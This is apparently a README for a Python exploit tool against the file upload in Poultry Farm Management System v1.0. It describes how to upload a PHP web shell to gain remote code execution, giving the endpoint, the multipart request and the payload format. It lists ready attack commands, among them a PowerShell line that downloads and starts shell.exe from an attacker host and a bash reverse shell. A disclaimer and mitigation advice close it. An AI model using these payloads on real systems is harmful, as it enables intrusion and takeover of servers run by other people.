# Poultry Farm Management System v1.0 - RCE Exploit

### Vulnerability Type
**Unauthenticated File Upload with Remote Code Execution**

### Description
The Poultry Farm Management System v1.0 contains a critical vulnerability in the product upload functionality. The application fails to properly validate and sanitize file uploads, allowing attackers to upload PHP files disguised as product images. These uploaded PHP files can be executed to achieve remote code execution.

### Vulnerable Endpoint
```
POST /paultry/farm/product.php or POST /farm/product.php
```

### Attack Vector
The vulnerability can be exploited by:
1. Sending a POST request to the product upload endpoint
2. Uploading a PHP shell file with arbitrary commands
3. Accessing the uploaded file to execute the embedded commands

## Requirements

### Prerequisites
- Python 3.7+
- `requests` library
- `colorama` library (for colored output)
- Network access to the vulnerable target

### Installation

```bash
pip install requests colorama
```

Or install all dependencies:

```bash
pip install -r requirements.txt
```

## Usage

### Basic Usage
Run the script interactively:

```bash
python exploit.py
```

The script will prompt you for:
1. **Target IP Address** - The IP address of the vulnerable server
2. **Target Port** - The port number (default: 80)
3. **Command to Execute** - The system command to run on the target

### Example

```
==================================================
Interactive Backdoor Upload Tool
==================================================

Enter target IP address: 192.168.1.100
Enter target port (default: 80): 8080
Enter command to execute (default: powershell payload):
Command: whoami

==================================================
CONFIRMATION
==================================================
Target URL: http://192.168.1.100:8080
Command: whoami
Do you want to proceed? (yes/no): yes
```

## Features

✅ **Interactive Input** - Prompts for IP, port, and custom commands  
✅ **Default Values** - Sensible defaults for convenience  
✅ **Color-Coded Output** - Easy-to-read colored terminal output  
✅ **Confirmation Step** - Verify settings before execution  
✅ **Error Handling** - Graceful error messages for failed requests  
✅ **Flexible Commands** - Support for any shell command or PowerShell payload

## Common Commands

### Windows Targets
```powershell
powershell -Command "Invoke-WebRequest http://attacker-ip:8787/shell.exe -OutFile shell.exe; Start-Process shell.exe"
```

### Linux Targets
```bash
bash -i >& /dev/tcp/attacker-ip/4444 0>&1
```

### Information Gathering
```bash
whoami
id
ifconfig
hostname
pwd
```

## Technical Details

### How It Works

1. **File Upload**: Sends a POST request with PHP payload embedded as a file
2. **Payload Execution**: The uploaded PHP file is stored in `/assets/img/productimages/`
3. **Command Execution**: Accessing the PHP file triggers command execution via `system()` function
4. **Output Retrieval**: The script fetches the output via GET request

### Request Structure

```
POST /paultry/farm/product.php
Content-Type: multipart/form-data

category=CHICKEN
product=rce
price=100
save=
productimage=[PHP_PAYLOAD]
```

### Payload Format
```php
<?php system('COMMAND_HERE');?>
```

## Testing Environment

The exploit was tested on:
- **OS:** Windows 10
- **Server:** XAMPP v3.3.0
- **PHP Version:** Compatible with PHP 5.6+

## Disclaimer

⚠️ **LEGAL WARNING**

This tool is provided for **authorized security testing and educational purposes only**. Unauthorized access to computer systems is illegal. 

- Only use this exploit on systems you own or have explicit written permission to test
- The authors assume no liability for misuse or damage caused by this tool
- Users are responsible for ensuring they comply with all applicable laws and regulations
- Unauthorized access, modification, or disruption of computer systems is a federal crime under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide

## Mitigation

### For Administrators

1. **Update Software** - Apply security patches if available
2. **File Upload Validation**
   - Validate file extensions (whitelist: jpg, png, gif, etc.)
   - Check MIME types on server-side
   - Store uploaded files outside web root
   - Disable script execution in upload directories

3. **Configuration**
   ```apache
   <Directory /uploads>
       php_flag engine off
       AddType text/plain .php .phtml .php3 .php4 .php5 .phar
   </Directory>
   ```

4. **Access Control**
   - Implement authentication before allowing uploads
   - Validate user permissions
   - Add rate limiting

5. **Monitoring**
   - Monitor upload directories for suspicious files
   - Log all upload attempts
   - Implement file integrity checking

## References

- **Exploit DB:** https://www.exploit-db.com/exploits/52053
- **GitHub:** https://github.com/w3bn00b3r/Unauthenticated-Remote-Code-Execution-RCE---Poultry-Farm-Management-System-v1.0/
- **Original Software:** https://www.sourcecodester.com/php/15230/poultry-farm-management-system-free-download.html

## Troubleshooting

### Connection Refused
```
Error: Connection refused
Solution: Verify the target IP and port are correct and the application is running
```

### 404 Not Found
```
Error: Failed to upload shell. Status code: 404
Solution: The endpoint path may differ. Common paths: /farm/, /paultry/farm/
```

### PHP Not Executed
```
Error: Command output is empty
Solution: PHP execution may be disabled or the file wasn't uploaded correctly
```

## Support

For issues, questions, or improvements, refer to the GitHub repository or Exploit-DB page.

---

**Last Updated:** December 2024  
**Status:** Verified and Tested
